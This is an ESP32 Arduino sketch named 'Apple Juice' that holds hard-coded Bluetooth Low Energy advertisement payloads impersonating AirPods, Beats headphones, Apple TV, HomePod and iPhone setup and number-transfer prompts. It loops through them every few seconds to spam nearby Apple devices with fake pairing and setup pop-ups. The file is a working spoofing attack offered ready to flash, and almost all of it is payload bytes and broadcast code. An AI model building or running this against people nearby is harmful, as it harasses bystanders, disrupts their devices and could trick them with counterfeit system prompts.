// ESP32 Arduino implementation of Apple Juice
// Author: Ronald Stoner 
// Github: https://github.com/ronaldstoner

// Based on the previous work of chipik / _hexway / ECTO-1A & SAY-10

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>

enum DeviceType {
  DEVICE_TYPE_AIRPODS,
  DEVICE_TYPE_AIRPODS_PRO,
  DEVICE_TYPE_AIRPODS_MAX,
  DEVICE_TYPE_AIRPODS_GEN2,
  DEVICE_TYPE_AIRPODS_GEN3,
  DEVICE_TYPE_AIRPODS_PRO_GEN2,
  DEVICE_TYPE_POWER_BEATS,
  DEVICE_TYPE_POWER_BEATS_PRO,
  DEVICE_TYPE_BEATS_SOLO_PRO,
  DEVICE_TYPE_BEATS_STUDIO_BUDS,
  DEVICE_TYPE_BEATS_FLEX,
  DEVICE_TYPE_BEATS_X,
  DEVICE_TYPE_BEATS_SOLO3,
  DEVICE_TYPE_BEATS_STUDIO3,
  DEVICE_TYPE_BEATS_STUDIO_PRO,
  DEVICE_TYPE_BEATS_FIT_PRO,
  DEVICE_TYPE_BEATS_STUDIO_BUDS_PLUS,
  DEVICE_TYPE_APPLE_TV_SETUP,
  DEVICE_TYPE_APPLE_TV_PAIR,
  DEVICE_TYPE_APPLE_TV_NEW_USER,
  DEVICE_TYPE_APPLE_TV_APPLE_ID_SETUP,
  DEVICE_TYPE_APPLE_TV_WIRELESS_AUDIO_SYNC,
  DEVICE_TYPE_APPLE_TV_HOMEKIT_SETUP,
  DEVICE_TYPE_APPLE_TV_KEYBOARD,
  DEVICE_TYPE_APPLE_TV_CONNECTING_TO_NETWORK,
  DEVICE_TYPE_HOMEPOD_SETUP,
  DEVICE_TYPE_SETUP_NEW_PHONE,
  DEVICE_TYPE_TRANSFER_NUMBER,
  DEVICE_TYPE_TV_COLOR_BALANCE,

  DEVICE_AMOUNT  // Add new device on the previous line
};

struct Payload {
  uint8_t *data;
  size_t length;
};

// Payload data
uint8_t dataAirpods[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataAirpodsPro[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataAirpodsMax[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataAirpodsGen2[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataAirpodsGen3[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataAirpodsProGen2[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataPowerBeats[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataPowerBeatsPro[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataBeatsSoloPro[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataBeatsStudiouBds[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataBeatsFlex[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataBeatsX[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataBeatsSolo3[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataBeatsStudio3[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataBeatsStudioPro[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataBeatsFitPro[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataBeatsStudioBudsPlus[31] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
uint8_t dataAppleTVSetup[23] = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
uint8_t dataAppleTVPair[23] = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
uint8_t dataAppleTVNewUser[23] = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
uint8_t dataAppleTVAppleIDSetup[23] = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
uint8_t dataAppleTVWirelessAudioSync[23] = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0xc0, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
uint8_t dataAppleTVHomekitSetup[23] = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
uint8_t dataAppleTVKeyboard[23] = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
uint8_t dataAppleTVConnectingToNetwork[23] = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
uint8_t dataHomepodSetup[23] = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
uint8_t dataSetupNewPhone[23] = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
uint8_t dataTransferNumber[23] = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };
uint8_t dataTVColorBalance[23] = { 0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00 };

Payload payloads[DEVICE_AMOUNT] = {};
BLEAdvertising *pAdvertising;

// User selectable variables
int deviceType = DEVICE_TYPE_AIRPODS;  // default device type
int delaySeconds = 4;  // delay in seconds
esp_ble_adv_type_t advertType = ADV_TYPE_SCAN_IND;  // advertisement data type

/**
 * @brief Register devices and their corresponding payloads.
 * 
 */
void setPayloads() {
  payloads[DEVICE_TYPE_AIRPODS] = { dataAirpods, sizeof(dataAirpods) };
  payloads[DEVICE_TYPE_AIRPODS_PRO] = { dataAirpodsPro, sizeof(dataAirpodsPro) };
  payloads[DEVICE_TYPE_AIRPODS_MAX] = { dataAirpodsMax, sizeof(dataAirpodsMax) };
  payloads[DEVICE_TYPE_AIRPODS_GEN2] = { dataAirpodsGen2, sizeof(dataAirpodsGen2) };
  payloads[DEVICE_TYPE_AIRPODS_GEN3] = { dataAirpodsGen3, sizeof(dataAirpodsGen3) };
  payloads[DEVICE_TYPE_AIRPODS_PRO_GEN2] = { dataAirpodsProGen2, sizeof(dataAirpodsProGen2) };
  payloads[DEVICE_TYPE_POWER_BEATS] = { dataPowerBeats, sizeof(dataPowerBeats) };
  payloads[DEVICE_TYPE_POWER_BEATS_PRO] = { dataPowerBeatsPro, sizeof(dataPowerBeatsPro) };
  payloads[DEVICE_TYPE_BEATS_SOLO_PRO] = { dataBeatsSoloPro, sizeof(dataBeatsSoloPro) };
  payloads[DEVICE_TYPE_BEATS_STUDIO_BUDS] = { dataBeatsStudiouBds, sizeof(dataBeatsStudiouBds) };
  payloads[DEVICE_TYPE_BEATS_FLEX] = { dataBeatsFlex, sizeof(dataBeatsFlex) };
  payloads[DEVICE_TYPE_BEATS_X] = { dataBeatsX, sizeof(dataBeatsX) };
  payloads[DEVICE_TYPE_BEATS_SOLO3] = { dataBeatsSolo3, sizeof(dataBeatsSolo3) };
  payloads[DEVICE_TYPE_BEATS_STUDIO3] = { dataBeatsStudio3, sizeof(dataBeatsStudio3) };
  payloads[DEVICE_TYPE_BEATS_STUDIO_PRO] = { dataBeatsStudioPro, sizeof(dataBeatsStudioPro) };
  payloads[DEVICE_TYPE_BEATS_FIT_PRO] = { dataBeatsFitPro, sizeof(dataBeatsFitPro) };
  payloads[DEVICE_TYPE_BEATS_STUDIO_BUDS_PLUS] = { dataBeatsStudioBudsPlus, sizeof(dataBeatsStudioBudsPlus) };
  payloads[DEVICE_TYPE_APPLE_TV_SETUP] = { dataAppleTVSetup, sizeof(dataAppleTVSetup) };
  payloads[DEVICE_TYPE_APPLE_TV_PAIR] = { dataAppleTVPair, sizeof(dataAppleTVPair) };
  payloads[DEVICE_TYPE_APPLE_TV_NEW_USER] = { dataAppleTVNewUser, sizeof(dataAppleTVNewUser) };
  payloads[DEVICE_TYPE_APPLE_TV_APPLE_ID_SETUP] = { dataAppleTVAppleIDSetup, sizeof(dataAppleTVAppleIDSetup) };
  payloads[DEVICE_TYPE_APPLE_TV_WIRELESS_AUDIO_SYNC] = { dataAppleTVWirelessAudioSync, sizeof(dataAppleTVWirelessAudioSync) };
  payloads[DEVICE_TYPE_APPLE_TV_HOMEKIT_SETUP] = { dataAppleTVHomekitSetup, sizeof(dataAppleTVHomekitSetup) };
  payloads[DEVICE_TYPE_APPLE_TV_KEYBOARD] = { dataAppleTVKeyboard, sizeof(dataAppleTVKeyboard) };
  payloads[DEVICE_TYPE_APPLE_TV_CONNECTING_TO_NETWORK] = { dataAppleTVConnectingToNetwork, sizeof(dataAppleTVConnectingToNetwork) };
  payloads[DEVICE_TYPE_HOMEPOD_SETUP] = { dataHomepodSetup, sizeof(dataHomepodSetup) };
  payloads[DEVICE_TYPE_SETUP_NEW_PHONE] = { dataSetupNewPhone, sizeof(dataSetupNewPhone) };
  payloads[DEVICE_TYPE_TRANSFER_NUMBER] = { dataTransferNumber, sizeof(dataTransferNumber) };
  payloads[DEVICE_TYPE_TV_COLOR_BALANCE] = { dataTVColorBalance, sizeof(dataTVColorBalance) };
}

void setup() {
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");

  BLEDevice::init("");

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  setPayloads();

  // Set the advertisement data type
  pAdvertising->setAdvertisementType(advertType);
}

void loop() {
  // Start advertising
  Serial.println("Sending Advertisement...");
  Serial.println(deviceType);

  // Set payload
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
  oAdvertisementData.addData(std::string((char *)(payloads[deviceType].data), payloads[deviceType].length));
  pAdvertising->setAdvertisementData(oAdvertisementData);

  pAdvertising->start();
  delay(delaySeconds * 1000); // delay for delaySeconds seconds
  pAdvertising->stop();
  deviceType = (deviceType + 1) % DEVICE_AMOUNT;
}